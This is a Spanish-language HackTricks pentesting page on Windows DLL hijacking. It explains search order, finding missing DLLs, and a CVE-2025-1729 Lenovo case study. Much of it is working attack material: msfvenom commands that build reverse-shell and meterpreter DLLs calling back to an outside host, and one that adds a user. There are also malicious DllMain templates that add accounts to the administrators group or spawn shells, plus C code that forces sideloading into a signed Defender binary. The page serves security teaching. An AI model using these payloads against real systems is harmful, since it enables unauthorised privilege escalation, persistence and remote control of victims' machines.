# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Información básica

DLL Hijacking consiste en manipular una aplicación de confianza para que cargue una DLL maliciosa. Este término abarca varias tácticas como **DLL Spoofing, Injection, and Side-Loading**. Se utiliza principalmente para code execution, para lograr persistence y, con menos frecuencia, para privilege escalation. A pesar del enfoque en la escalada aquí, el método de hijacking permanece consistente entre los distintos objetivos.

### Técnicas comunes

Se emplean varios métodos para DLL hijacking, y su efectividad depende de la estrategia de carga de DLLs de la aplicación:

1. **DLL Replacement**: Intercambiar una DLL legítima por una maliciosa, opcionalmente usando DLL Proxying para preservar la funcionalidad de la DLL original.
2. **DLL Search Order Hijacking**: Colocar la DLL maliciosa en una ruta de búsqueda antes que la legítima, explotando el patrón de búsqueda de la aplicación.
3. **Phantom DLL Hijacking**: Crear una DLL maliciosa que la aplicación cargue pensando que es una DLL requerida que no existe.
4. **DLL Redirection**: Modificar parámetros de búsqueda como %PATH% o archivos .exe.manifest / .exe.local para dirigir la aplicación hacia la DLL maliciosa.
5. **WinSxS DLL Replacement**: Sustituir la DLL legítima por una maliciosa en el directorio WinSxS, un método frecuentemente asociado con DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar la DLL maliciosa en un directorio controlado por el usuario junto con la aplicación copiada, semejante a las técnicas de Binary Proxy Execution.

## Encontrar Dlls faltantes

La forma más común de encontrar Dlls faltantes dentro de un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **siguientes 2 filtros**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

y simplemente mostrar la **File System Activity**:

![](<../../../images/image (153).png>)

Si buscas **missing dlls in general** deja esto ejecutándose durante unos **segundos**.\
Si buscas un **missing dll inside an specific executable** deberías configurar **otro filtro como "Process Name" "contains" "\<exec name>", ejecutarlo y detener la captura de eventos**.

## Explotación de Dlls faltantes

Para escalar privilegios, la mejor oportunidad es poder escribir una dll que un proceso privilegiado intente cargar en alguno de los lugares donde se buscará. Por lo tanto, podremos escribir una dll en una carpeta donde la dll se busque antes que en la carpeta donde está la dll original (caso extraño), o podremos escribirla en alguna carpeta donde la dll será buscada y la dll original no exista en ninguna carpeta.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Las aplicaciones de Windows buscan DLLs siguiendo una serie de rutas de búsqueda predefinidas, respetando un orden particular. El problema del DLL hijacking surge cuando una DLL maliciosa se coloca estratégicamente en uno de estos directorios, asegurando que se cargue antes que la DLL auténtica. Una solución para evitar esto es asegurar que la aplicación use rutas absolutas al referirse a las DLLs que requiere.

You can see the **DLL search order on 32-bit** systems below:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

That is the **default** search order with **SafeDllSearchMode** enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value and set it to 0 (default is enabled).

If [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function is called with **LOAD_WITH_ALTERED_SEARCH_PATH** the search begins in the directory of the executable module that **LoadLibraryEx** is loading.

Finally, note that **a dll could be loaded indicating the absolute path instead just the name**. In that case that dll is **only going to be searched in that path** (if the dll has any dependencies, they are going to be searched as just loaded by name).

There are other ways to alter the ways to alter the search order but I'm not going to explain them here.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Ejemplo mínimo en C (ntdll, wide strings, manejo de errores simplificado):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Ejemplo de uso operativo
- Coloca un xmllite.dll malicioso (exportando las funciones requeridas o proxyando al real) en tu directorio DllPath.
- Lanza un binario firmado que se sabe que busca xmllite.dll por nombre usando la técnica anterior. El loader resuelve la importación vía el DllPath suministrado y sideloads tu DLL.

Esta técnica se ha observado in-the-wild para impulsar cadenas de sideloading multi-stage: un lanzador inicial deja caer un DLL auxiliar, que luego genera un binario hijackable firmado por Microsoft con un DllPath personalizado para forzar la carga del DLL del atacante desde un staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalado de privilegios

**Requisitos**:

- Identificar un proceso que opere o vaya a operar bajo **privilegios diferentes** (horizontal or lateral movement), que esté **faltar de un DLL**.
- Asegurarse de que haya **acceso de escritura** disponible en cualquier **directorio** en el que se vaya a **buscar el DLL**. Esta ubicación podría ser el directorio del ejecutable o un directorio dentro del system path.

Sí, los requisitos son complicados de encontrar ya que **por defecto es algo raro encontrar un ejecutable privilegiado que le falte un dll** y es aún **más raro tener permisos de escritura en una carpeta de la ruta del sistema** (no se puede por defecto). Pero, en entornos mal configurados esto es posible.\
En el caso de que tengas suerte y cumplas los requisitos, puedes revisar el proyecto [UACME](https://github.com/hfiref0x/UACME). Incluso si el **objetivo principal del proyecto es bypass UAC**, puedes encontrar allí un **PoC** de un Dll hijaking para la versión de Windows que necesites usar (probablemente solo cambiando la ruta de la carpeta donde tienes permisos de escritura).

Ten en cuenta que puedes **comprobar tus permisos en una carpeta** haciendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **verifica los permisos de todas las carpetas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes comprobar los imports de un executable y los exports de una dll con:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para una guía completa sobre cómo **abuse Dll Hijacking to escalate privileges** con permisos para escribir en una **carpeta del PATH del sistema** consulta:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Herramientas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) will check if you have write permissions on any folder inside system PATH.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Ejemplo

En caso de encontrar un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear una dll que exporte al menos todas las funciones que el ejecutable importará desde ella**. De todas formas, ten en cuenta que Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **how to create a valid dll** dentro de este estudio sobre dll hijacking enfocado en dll hijacking para ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **siguiente sección** puedes encontrar algunos **códigos básicos de dll** que podrían ser útiles como **plantillas** o para crear una **dll con funciones no requeridas exportadas**.

## **Creación y compilación de Dlls**

### **Proxificación de Dlls**

Básicamente, un **Dll proxy** es una Dll capaz de **ejecutar tu código malicioso al cargarse**, pero también de **exponer** y **funcionar** como se espera **reenviando todas las llamadas a la biblioteca real**.

Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes realmente **indicar un ejecutable y seleccionar la biblioteca** que quieres proxificar y **generar una dll proxificada** o **indicar la Dll** y **generar una dll proxificada**.

### **Meterpreter**

**Obtener rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtener un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (x86 no vi una versión x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tu propio

Ten en cuenta que, en varios casos la Dll que compiles debe **export several functions** que van a ser cargadas por el victim process, si estas functions no existen el **binary won't be able to load** them y el **exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Estudio de caso: CVE-2025-1729 - Escalada de privilegios usando TPQMAssistant.exe

Este caso demuestra **Phantom DLL Hijacking** en el TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), rastreado como **CVE-2025-1729**.

### Detalles de la vulnerabilidad

- **Componente**: `TPQMAssistant.exe` ubicado en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tarea programada**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se ejecuta diariamente a las 9:30 AM bajo el contexto del usuario conectado.
- **Permisos del directorio**: Escribible por `CREATOR OWNER`, permitiendo a usuarios locales colocar archivos arbitrarios.
- **Comportamiento de búsqueda de DLL**: Intenta cargar `hostfxr.dll` desde su directorio de trabajo primero y registra "NAME NOT FOUND" si falta, lo que indica preferencia de búsqueda en el directorio local.

### Implementación del exploit

Un atacante puede colocar un stub malicioso de `hostfxr.dll` en el mismo directorio, explotando la DLL ausente para lograr ejecución de código bajo el contexto del usuario:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flujo del ataque

1. Como usuario estándar, coloca `hostfxr.dll` en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Espera a que la tarea programada se ejecute a las 9:30 AM en el contexto del usuario actual.
3. Si un administrador ha iniciado sesión cuando se ejecuta la tarea, la DLL maliciosa se ejecuta en la sesión del administrador con nivel de integridad medio.
4. Encadena técnicas estándar de bypass de UAC para elevarse desde nivel de integridad medio a privilegios SYSTEM.

### Mitigación

Lenovo lanzó la versión UWP **1.12.54.0** a través de Microsoft Store, la cual instala TPQMAssistant en `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\`, elimina la tarea programada vulnerable y desinstala los componentes Win32 heredados.

## Referencias

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)


- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../../banners/hacktricks-training.md}}
